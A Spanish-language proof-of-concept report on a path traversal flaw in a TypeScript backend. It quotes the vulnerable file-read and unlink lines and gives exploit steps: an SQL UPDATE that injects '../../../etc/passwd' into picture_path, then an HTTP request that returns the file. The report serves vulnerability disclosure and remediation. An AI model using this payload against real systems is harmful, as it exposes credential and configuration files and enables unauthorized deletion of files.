# Prueba de Concepto - Path Traversal

## Vulnerabilidad encontrada
La vulnerabilidad de Path Traversal que encontramos se halla en el método `getProfilePicture` del archivo `fileService.ts`. El problema radica en que el código utiliza directamente el valor del campo `picture_path` almacenado en la base de datos para leer archivos del sistema, sin realizar validación o sanitización alguna. Ninguna de las funciones donde esto ocurre verifican que el archivo esté dentro del directorio permitido, tampoco tienen medidas para prevenir secuencias de directorio padre (`../`).

**Archivo vulnerable:** `services/backend/src/services/fileService.ts:39`
```typescript
const filePath = user.picture_path;  // No hay validación, se usa la ruta como viene de la BD
const stream = fs.createReadStream(filePath);  // Esto puede abrir cualquier archivo usando por ejemplo una ruta del propio sistema
```

**Archivo vulnerable:** `services/backend/src/services/fileService.ts:72`
```typescript
try { await unlink(path.resolve(user.picture_path)); } catch { /*ignore*/ }  // Lo mismo, se hace unlink y un path.resolve sin validar la ruta que viene de la BD
```

**Archivo vulnerable:** `services/backend/src/services/clinicalHistoryService.ts:133`
```typescript
try { await unlink(path.resolve(f.path)); } catch {}  // Al igual que en el anterior, unlink y path.resolve sin validar lo que viene
```

## Cómo explotar (un ejemplo con la ruta /etc/passwd)

### Paso 1: Identificar el usuario objetivo
- Obtener el ID de un usuario existente en el sistema

### Paso 2: Modificar el campo picture_path en la base de datos
Usar SQL Injection u otro método para ejecutar:
```sql
UPDATE users 
SET picture_path = '../../../etc/passwd' 
WHERE id = 'USER_ID_AQUÍ';
```

### Paso 3: Hacer petición para obtener la foto de perfil
```http
GET /api/users/profile-picture HTTP/1.1
Host: localhost:3000
Authorization: Bearer TOKEN_DEL_USUARIO
```

### Paso 4: El servidor devolverá el contenido del archivo /etc/passwd

## Resultado esperado
- El payload de path traversal inyectado (p. ej. /etc/passwd o ../../../../etc/passwd) se utiliza cuando la aplicación lee user.picture_path (o f.path) y la respuesta HTTP contiene el contenido del archivo apuntado
- Se puede extraer el contenido de cualquier archivo accesible por el proceso del servidor (configuraciones, .env, claves, backups, /etc/passwd, etc.)
- Los errores o mensajes devueltos por la aplicación pueden revelar rutas, permisos y estructura del filesystem (por ejemplo, rutas absolutas, nombres de directorios, permisos denegados).

## Impacto
- Acceso no autorizado a datos sensibles almacenados en el servidor: archivos de configuración, variables de entorno, logs, backups, etc.
- Extracción de credenciales y llaves (API keys, claves SSH, credenciales de BD) que permiten ataques posteriores contra la infraestructura 
- Bypass de controles de acceso y exposición de recursos privados
